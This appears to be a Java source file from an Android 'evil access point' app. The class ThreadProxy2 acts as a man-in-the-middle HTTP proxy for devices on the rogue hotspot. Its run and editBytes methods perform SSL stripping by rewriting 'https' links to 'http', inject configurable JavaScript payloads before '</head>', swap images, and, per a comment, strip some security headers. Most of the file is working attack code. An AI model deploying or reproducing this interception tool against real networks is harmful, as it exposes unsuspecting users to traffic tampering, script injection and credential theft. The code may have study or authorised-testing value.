package com.nibiru.evil_ap.proxy;

import android.content.SharedPreferences;
import android.util.Log;

import com.nibiru.evil_ap.ConfigTags;
import com.nibiru.evil_ap.SharedClass;
import com.nibiru.evil_ap.log.Client;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.util.List;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by Nibiru on 2016-11-25.
 */

public class ThreadProxy2 implements Runnable{
    /**************************************CLASS FIELDS********************************************/
    protected final String TAG = getClass().getSimpleName();
    private Socket sClient;
    private Client c;
    private OkHttpParser rp;
    private OkHttpClient okhttp;
    private SharedPreferences mConfig;
    private SharedClass mSharedObj;
    private boolean debug = true;
    /**************************************CLASS METHODS*******************************************/
    ThreadProxy2(Socket sClient, SharedPreferences config, SharedClass sharedObj) {
        this.sClient = sClient;
        rp = new OkHttpParser();
        //make client not follow redirects!
        okhttp = new OkHttpClient().newBuilder().followRedirects(false).followSslRedirects(false)
                .build();
        mConfig = config;
        mSharedObj = sharedObj;
        c = mSharedObj.getClientByIp(sClient.getInetAddress().toString().substring(1));
    }
    @Override
    public void run() {
        //things we will eventually close
        BufferedReader inFromClient = null;
        InputStream inFromServer = null;
        OutputStream outToClient = null;
        Response res = null;
        try {
            inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
            outToClient = sClient.getOutputStream();

            //get client request string
            String sRequest = getRequestString(inFromClient);
            if (sRequest == null) {return;}

            //parse string request into okhttp request (remove some security headers)
            Request req = rp.parse(sRequest, mSharedObj, c);
            if (req == null) {return;}

            //make request and get response
            res = okhttp.newCall(req).execute();

            //prepare response
            byte[] bytesBody = res.body().bytes();
            //check what we are sending back
            String contentType = res.header("Content-Type");

            //EDIT RESPONSE HERE
            boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
            boolean jsInject =  mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
            if( sslStrip || jsInject)
                bytesBody = editBytes(bytesBody, sslStrip, jsInject);
            //prepare proper length response headers
            String headers = getResponseHeaders(res, bytesBody.length, getEtag(sRequest));
            headers = headers.replaceAll("\\n", "\r\n");

            ByteArrayOutputStream streamResponse = new ByteArrayOutputStream();

            //if we are sending back image and imgReplace is on then swap img bytes
            if (contentType != null && contentType.contains("image")
                    && mConfig.getBoolean("imgReplace", false)){
                //update content length
                headers = headers.replaceAll("Content-Length:.*", "Content-Length: " +
                        mSharedObj.getImgDataLength());
                streamResponse = swapImg(headers, streamResponse);
            }
            else {
                streamResponse.write(headers.getBytes());
                streamResponse.write(bytesBody);
            }

            //send to client
            if (debug) Log.d(TAG + "[OUT]", headers);
            inFromServer = new ByteArrayInputStream(streamResponse.toByteArray());
            sendInStreamToOutStream(inFromServer, outToClient);

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            //clean up
            if (res != null) res.body().close();
            try {
                if (outToClient != null) outToClient.close();
                if (inFromServer != null) inFromServer.close();
                if (sClient != null) sClient.close();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private ByteArrayOutputStream swapImg(String headers, ByteArrayOutputStream streamResponse)
            throws IOException {
        //add header bytes to stream
        streamResponse.write(headers.getBytes());
        //add swapped image bytes to stream
        streamResponse.write(mSharedObj.getImgData());
        return streamResponse;
    }

    private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
        try {
            String response = new String(bytesBody, "UTF-8");
            if (sslStrip) {
                response = response.replaceAll("https", "http");
            }
            if (jsInject){
                List<String> payloads = mSharedObj.getPayloads();
                String full = "";
                for(String p: payloads){
                    full += p;
                }
                response = response.replaceAll("</head>", full + "</head>");
            }
            return response.getBytes();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }

    // convert InputStream to String
    private static String getStringFromInputStream(InputStream is) {

        BufferedReader br = null;
        StringBuilder sb = new StringBuilder();

        String line;
        try {

            br = new BufferedReader(new InputStreamReader(is));
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return sb.toString();

    }

    private void sendInStreamToOutStream(InputStream in, OutputStream out){
        byte[] reply = new byte[4096];
        int bytes_read;
        try {
            while ((bytes_read = in.read(reply)) != -1) {
                out.write(reply, 0, bytes_read);
                out.flush();
            }
            if (debug) Log.d(TAG + "[OUT]", "sent entire body!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String getEtag(String sRequest){
        String result = "";
        if (sRequest.contains("\"")) {
            result = sRequest.substring(sRequest.indexOf("\"") + 1);
            result = result.substring(0, result.indexOf("\""));
        }
        return "\"" + result + "\"";
    }

    private String getResponseHeaders(Response res, int len, String eTag) throws IOException {
        String resToClient = "";
        if (debug) Log.d(TAG, "<==================Sending response==================>");
        //find status line
        // /n ! not /r/n !
        switch (res.code()) {
            case 200: resToClient += "HTTP/1.1 200 OK\n"; break;
            case 204: resToClient += "HTTP/1.1 204 No Content\n"; break;
            case 301: resToClient += "HTTP/1.1 301 Moved Permanently\n"; break;
            case 302: resToClient += "HTTP/1.1 302 Found\n"; break;
            case 304: resToClient += "HTTP/1.1 304 Not Modified\n"; break;
            case 403: resToClient += "HTTP/1.1 403 Forbidden\n"; break;
            case 404: resToClient += "HTTP/1.1 404 Not Found\n"; break;
            default: Log.e(TAG, "UNKNOWN STATUS CODE = " + res.code());
        }
        //send headers
        resToClient += res.headers().toString() + "\n";
        //workaround for okhttp transparent gzip
        resToClient = resToClient.replace("Transfer-Encoding: chunked",
                "Content-Length: " + len);
        //workaround for 304's not working
        if (resToClient.startsWith("HTTP/1.1 304")) {
            resToClient = resToClient.replace("Connection: keep-alive", "Connection: close");
            resToClient = resToClient.replaceAll("ETag:.*", "ETag: " + eTag);
        }
        return resToClient;
    }

    private String getRequestString(BufferedReader in) throws IOException {
        String request = "";
        String body = "";
        String line;
        int length = 0;
        //read string request until there are no lines to read
        while ((line = in.readLine()) != null) {
            //last line of request message header is a blank line (\r\n\r\n)
            if (line.isEmpty()) {
                break;
            }
            //TODO: implement POST
            if (line.startsWith("POST")) {
                Log.e(TAG, "DROPPED POST REQUEST!");
                return null;
            }
            if (line.startsWith("Content-Length")) { //get the content-length
                int index = line.indexOf(':') + 1;
                String len = line.substring(index).trim();
                length = Integer.parseInt(len);
            }
            //make sure content is not zipped...
            //by not including the Accept-Encoding header
            if (!line.startsWith("Accept-Encoding")) {
                /*Log.d(TAG + "[IN]", "Accept-Encoding: identity");
                request += "Accept-Encoding: identity\r\n";*/
                if (debug) Log.d(TAG + "[IN]", line);
                request += line + "\r\n";
            }
        }
        // if there is Message body, go in to this loop
        if (length > 0) {
            int read;
            while ((read = in.read()) != -1) {
                body += ((char) read);
                if (body.length() == length) break;
            }
        }
        request += body; // adding the body to request
        return request;
    }

}
